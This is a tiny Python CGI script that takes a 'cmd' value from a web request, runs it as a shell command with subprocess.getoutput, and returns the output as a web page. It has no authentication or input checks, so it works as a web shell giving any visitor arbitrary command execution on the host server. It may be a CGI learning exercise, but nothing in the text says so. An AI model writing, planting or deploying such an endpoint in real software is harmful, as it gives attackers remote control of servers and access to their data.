#!/usr/bin/python3
import cgi
print("content-type: text/html")
#print("location: http://www.google.com")
print()

form=cgi.FieldStorage()
cmd=form.getvalue("cmd")

import subprocess
x=subprocess.getoutput(cmd)
print(x)
